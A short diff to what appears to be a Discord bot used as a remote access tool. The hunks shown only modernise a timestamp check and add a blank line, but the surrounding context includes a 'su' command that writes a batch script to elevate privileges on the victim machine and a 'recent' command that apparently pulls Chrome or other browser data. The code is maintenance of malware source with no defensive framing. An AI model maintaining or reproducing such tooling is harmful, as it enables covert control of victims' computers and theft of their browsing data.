@@ -626,7 +626,7 @@ async def su(ctx):
                             if (
                                 message.author == bot.user
                                 and "✅ **Connected - !help for command info." in message.content
-                                and datetime.utcnow() - message.created_at < timedelta(seconds=40)
+                                and (datetime.now(timezone.utc) - message.created_at) < timedelta(seconds=40)
                             ):
                                 batch_script = f"""
                                 @echo off
@@ -646,6 +646,7 @@ async def su(ctx):
 
     except Exception as e:
         await ctx.send(f"❌ Failed to elevate privileges: {str(e)}{watermark()}")
+
 
 @bot.command()
 async def recent(ctx, browser: str = "chrome"):
